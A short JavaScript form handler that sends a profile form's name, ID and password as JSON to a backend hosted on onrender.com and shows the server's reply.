document.getElementById("profileForm").addEventListener("submit", async function(event) {
    event.preventDefault();
    const value = {
        name: document.getElementById("name").value,
        Id: document.getElementById("Id").value,
        psw: document.getElementById("psw").value
    };
    const message = document.getElementById("profileMessage");
    try {
        const response = await fetch("https://file-3-3d91.onrender.com/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(value)
        });
        const data = await response.json();
        message.innerText = data.message;
        if (response.ok) {
            document.getElementById("profileForm").reset();
        }
    } catch (error) {
        message.innerText = "Something went wrong: " + error.message;
    }
});